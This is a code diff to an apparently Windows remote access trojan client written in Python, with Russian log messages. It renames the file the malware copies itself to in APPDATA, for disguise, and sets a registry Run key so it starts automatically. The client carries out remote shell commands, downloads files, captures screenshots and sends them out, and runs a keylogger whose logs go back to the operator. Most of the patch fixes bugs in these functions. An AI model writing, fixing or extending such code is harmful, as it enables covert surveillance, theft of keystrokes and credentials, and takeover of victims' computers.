@@ -15,14 +15,15 @@ import threading
 from keylogger import KeyLogger
 
 
+
+
+
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(message)s",
     filename="client_log.txt",
     filemode="a",
 )
-
-keylogger = KeyLogger()
 
 
 def reliable_send(data, sock):
@@ -65,9 +66,11 @@ def open_image():
 
 def setup_autorun():
     try:
-        location = os.environ["APPDATA"] + "\\ConfigSecurityPolicy.exe"
+        location = os.environ["APPDATA"] + "\\cutecat.exe"
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
+
+        reg_path = f'"{location}"'
 
         with winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
@@ -75,7 +78,7 @@ def setup_autorun():
             0,
             winreg.KEY_SET_VALUE,
         ) as key:
-            winreg.SetValueEx(key, "ConfigSecurityPolicy", 0, winreg.REG_SZ, location)
+            winreg.SetValueEx(key, "cutecat", 0, winreg.REG_SZ, reg_path)
             logging.info("[+] Запись в реестр добавлена.")
 
     except Exception as e:
@@ -107,13 +110,13 @@ def download(url, sock):
         reliable_send(f"[!!] Ошибка скачивания файла: {e}", sock)
 
 
-def screenshot():
+def screenshot(sock):
     try:
         with mss() as sct:
             screenshot_file = sct.shot(output="screenshot.png")
         with open(screenshot_file, "rb") as screen_file:
             logging.info("[+] Скриншот успешно создан")
-            reliable_send(base64.b64encode(screen_file.read()))
+            reliable_send(base64.b64encode(screen_file.read()), sock)
     finally:
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
@@ -159,9 +162,9 @@ def execute_command(sock, command):
         logging.error(f"[!!] Ошибка выполнения команды {command}: {e}")
 
 
-def send_keylog_file(sock):
+def send_keylog_file(sock, keylogger):
     try:
-        keylogger_path = os.path.join(os.environ["APPDATA"], "\\conf.txt")
+        keylogger_path = keylogger.path()
         if not os.path.exists(keylogger_path):
             reliable_send("[!!] Файл кейлогера отсутствует", sock)
             return
@@ -180,8 +183,8 @@ def send_keylog_file(sock):
         logging.error(f"[!!] Ошибка при отправке кейлогов: {e}")
 
 
-
 def shell(sock):
+    keylogger = KeyLogger()
     while True:
         try:
             command = reliable_recv(sock)
@@ -210,8 +213,7 @@ def shell(sock):
                 except Exception as e:
                     reliable_send(f"[!!] Ошибка запуска файла: {e}", sock)
             elif command.startswith("screenshot"):
-                screenshot_data = screenshot()
-                reliable_send(screenshot_data.decode(), sock)
+                screenshot(sock)
             elif command.startswith("check"):
                 is_admin(sock)
             elif command.startswith("keylog_start"):
@@ -222,7 +224,7 @@ def shell(sock):
                 else:
                     reliable_send("[!!] Кейлоггер уже запущен", sock)
             elif command.startswith("keylog_dump"):
-                send_keylog_file(sock)
+                send_keylog_file(sock, keylogger)
             else:
                 execute_command(sock, command)
         except Exception as e:
